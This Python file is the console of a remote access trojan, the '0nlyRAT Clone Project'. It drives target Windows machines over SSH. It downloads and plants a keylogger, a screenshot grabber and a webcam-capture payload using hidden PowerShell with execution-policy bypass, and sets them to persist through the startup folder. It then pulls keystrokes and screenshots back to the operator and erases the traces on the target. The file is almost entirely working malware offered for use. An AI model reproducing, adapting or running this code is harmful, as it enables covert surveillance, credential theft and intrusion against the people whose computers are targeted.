#!/usr/bin/python
# python console for the RAT to interact with target pc

import os
import sys
import getpass
import string
import secrets as s
import random as r
from datetime import datetime

banner = r"""
  /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$$_  $$          | $$          | $$__  $$ /$$__  $$|__  $$__/
| $$$$\ $$ /$$$$$$$ | $$ /$$   /$$| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$__  $$| $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
| $$\ $$$$| $$  \ $$| $$| $$  | $$| $$__  $$| $$__  $$   | $$   
| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$  | $$| $$  | $$   | $$   
 \______/ |__/  |__/|__/ \____  $$|__/  |__/|__/  |__/   |__/   
                         /$$  | $$                              
                        |  $$$$$$/                              
                         \______/                               
 
                
            [::] The Famous 0nlyRAT Clone Project :) [::]
"""

help_menu = """
            [::] 0nlyRAT help menu [::]

            [+] Arguments:                                   
                [*] <config file> with extension (.rat)
                [*] -h or --help    for help
                [*] -u or --update  for update
                [*] -r or --remove  for uninstall
            
"""

options_menu = """
            [+] command and control:
                [0]  Remote Console
                [1]  Install Keylogger       
                [2]  Fetch keylogs
                [3]  Install Screenshot
                [4]  Fetch Screenshot
                [5]  remote download 
                [6]  remote upload 
                [7]  restart target
                [8]  shutdown target
                [9]  Install Webcam Capture
                [10] Fetch Webcam Capture

            [+] Options:
                [-h] or [--help]     ---   help
                [-u] or [--update]   ---   update
                [-r] or [--remove]   ---   remove


            * any other commands will be a default
              terminal command
"""

username = getpass.getuser()
header = f"[~] {username}@onlyrat $ "
remote_path = "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads"
local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyRAT"
# local_download_path = f"/home/{username}/Downloads" if username!="root" else "/root/Downloads"

IP_KEY = "IPADDRESS"
PASS_KEY = "PASSWORD"
USERNAME_KEY = "USERNAME"
TEMPDIR_KEY = "TEMPDIR"
STARTUPDIR_KEY = "STARTUPDIR"

def get_current_date():
    return datetime.now().strftime("%m-%d-%Y_%H:%M:%S")

def read_config(config_file):
    if not os.path.exists(config_file):
        raise FileNotFoundError
    configuration = {}
    read_lines = open(config_file, "r").readlines()
    configuration[IP_KEY] = read_lines[0].strip()
    configuration[PASS_KEY] = read_lines[1].strip()
    configuration[USERNAME_KEY] = read_lines[2].strip()
    configuration[TEMPDIR_KEY] = read_lines[3].replace("\\","/").strip()
    configuration[STARTUPDIR_KEY] = read_lines[4].replace("\\","/").strip()
    return configuration

def show_config(configuration):
    for key,value in configuration.items():
        print(f"{key} : {value}")

# remotely connect to target
def connect(ipv4,pword):
    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4}")

def exit():
    print("[*] exiting...")
    sys.exit(1)

def clear():
    os.system("clear")

def os_detection():
    if os.name == "nt":
        return "w"
    if os.name == "posix":
        return "l"
    
def random_text():
    return ''.join(s.choice(string.ascii_letters+string.digits) for _ in range(r.randint(8,17)))

# scp upload
def remote_upload(ipv4,pword,local_file_path,remote_upload_path):
    print("\n[*] starting upload...")
    os.system(f"sshpass -p \"{pword}\" scp -r {local_file_path} onlyrat@{ipv4}:{remote_upload_path}")
    print("[+] upload complete...\n")

# scp download
def remote_download(ipv4,pword,remote_path_to_file):
    print("\n[*] starting download...")
    os.system("mkdir ~/Downloads")
    os.system(f"sshpass -p \"{pword}\" scp -r onlyrat@{ipv4}:{remote_path_to_file} ~/Downloads")
    print("[+] Download saved at \"~/Downloads\" directory\n")

def remote_command(ipv4,pword,command):
    os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")

def download(ipv4,pword):
    print("\n[~] Enter the file path you want to download :")
    download_file_path = input(header)
    print("\n[*] Downloading...")
    remote_download(ipv4,pword,download_file_path)

def upload(ipv4,pword,temp_dir):
    print("\n[~] Enter the file path you want to upload :")
    upload_file_path = input(header)
    print("\n[*] Uploading...")
    remote_upload(ipv4,pword,upload_file_path,temp_dir)
    print(f"[+] Successfully uploaded at \"{temp_dir}\"")

def keylogger(ipv4,pword,temp_path,startup_path):
    print("[+] Initializing keylogger....")
    keylogger_command  = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "{temp_path}/XukhovfGQPLEcYwZ.ps1"\\" """
    print("[+] keylogger prepared. Ready to download....")
    # print(keylogger_command,'\n\n',controller_command,'\n\n')
    print("[+] Initializing keylogger.....")
    remote_command(ipv4,pword,keylogger_command)
    print("[+] Initializing  controller.....")
    remote_command(ipv4,pword,controller_command)
    print("[*] keylogger installed successfully")

    print("\n[!] Restart target host to execute")

def fetch_keylogs(ipv4,pword,uname,temp_path):
    print(f"[+] Preparing to fetch keylogs from {temp_path}/{uname}.log...")
    remote_download(ipv4,pword,f"{temp_path}/{uname}.log")
    print(f"[*] Keylogs are saved at ~/Downloads")
    remote_command(ipv4,pword,f"powershell New-Item -path {temp_path}/{uname}.log -ItemType File -Force")
    print("[*] Success. Previous log files has been wiped...")

def install_screenshot(ipv4,pword,temp_path,startup_path):
    print("[+] Downloading screenshot script...")
    ss_script_download_command = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/ss.ps1 -outfile {temp_path}/VaxitRpwrPGyM.ps1\""
    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "{temp_path}/VaxitRpwrPGyM.ps1" \\" """
    remote_command(ipv4,pword,ss_script_download_command)
    remote_command(ipv4,pword,controller_command)
    print("[*] Download completed...")
    print("[*] Restart target host to start...")

def fetch_screenshot(ipv4,pword,temp_path,uname):
    print("[+] preparing to fetch screenshots...")
    ss_folder = f"screenshots-{uname}-{get_current_date()}"

    remote_download(ipv4,pword,f"{temp_path}/AbLtcVKTqN")

    os.system(f"mkdir ~/Downloads/{ss_folder}")
    os.system(f"mv ~/Downloads/AbLtcVKTqN/* ~/Downloads/{ss_folder}")
    os.system("rm -rf ~/Downloads/AbLtcVKTqN")
    print(f"[*] Screenshot saved at ~/Downloads folder...")
    print("[+] Preparing to remove screenshots folder from target host...")
    remote_command(ipv4,pword,f"powershell remove-item -path {temp_path}/AbLtcVKTqN -Force -recurse")
    print("[*] Done. Folder wiped...")

def install_camcap(ipv4,pword,temp_dir,startup_dir):
    print("[+] Downloading...")
    camcap_download = """powershell powershell.exe -noP -ep bypass -w hidden -c \"{new-item -path """+temp_dir+"""/QKlYTmHhCDy -itemtype directory -force; iwr -uri """+remote_path+"""/webcam_cap/camcap.exe -outfile """+temp_dir+"""/QKlYTmHhCDy/KJUwHZlCNV.exe}\" """
    print("[*] Downloaded cam caputre...")
    webcam_download = f"""powershell powershell.exe -noP -ep bypass -w hidden -c \"iwr -uri {remote_path}/webcam_cap/webcam.ps1 -outfile {temp_dir}/QKlYTmHhCDy/sjzQVatArhvlHXifK.ps1\" """
    print("[*] Downloaded webcam script...")
    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/sjzQVatArhvlHXifK.ps1" \\" """
    print("[*] Downloaded controller script...")
    remote_command(ipv4,pword,camcap_download)
    remote_command(ipv4,pword,webcam_download)
    remote_command(ipv4,pword,controller_command)
    print("\n[*] Downloaded completed...")
    print("[*] Restart target host to execute...")

def update():
    return

def remove():
    return

# command line interface
def cli(arguments):
    clear()
    print(banner)
    if arguments:
        argument = sys.argv[1]
        if argument.endswith(".rat"):
            try:
                configuration = read_config(argument)
            except FileNotFoundError:
                print(f"\nError: Config file '{argument}' does not exist.\n")
                exit()
            tgt_ipv4 = configuration.get(IP_KEY)
            tgt_pword = configuration.get(PASS_KEY)
            tgt_uname = configuration.get(USERNAME_KEY)
            tgt_td = configuration.get(TEMPDIR_KEY)
            tgt_sd = configuration.get(STARTUPDIR_KEY)
            print(options_menu)
            print("\t    [*] type \"help\" for help menu [*]\n")
            while True:
                option = input(f"{header}")
                if option == "0":
                    connect(tgt_ipv4,tgt_pword)
                elif option == "1":
                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                elif option == "2":
                    fetch_keylogs(tgt_ipv4,tgt_pword,tgt_uname,tgt_td)
                elif option == "3":
                    install_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                elif option == "4":
                    fetch_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
                elif option == "5":
                    download(tgt_ipv4,tgt_pword)
                elif option == "6":
                    upload(tgt_ipv4,tgt_pword,tgt_td)
                elif option == "7":
                    remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                elif option == "8":
                    remote_command(tgt_ipv4,tgt_pword,"shutdown /s /t 0")
                elif option == "9":
                    install_camcap(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                elif option in ["config","c"]:
                    show_config(configuration)
                elif option == "help":
                    clear()
                    print(banner)
                    print(options_menu)
                elif option in ["quit", "exit", "e", "q"]:
                    exit()
                else:
                    os.system(option)
                print("\n")
        elif argument in ["-h","--help"]:
            print(help_menu)
        elif argument in ["-u","--update"]:
            update()
        elif argument in ["-r","--remove","--uninstall"]:
            remove()
        else:
            print("[*] Can't interpret command")
    else:
        print(help_menu)

def main():
    clear()
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    except Exception:
        arguments_exist = False
    else:
        arguments_exist = True
    # run commandline interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()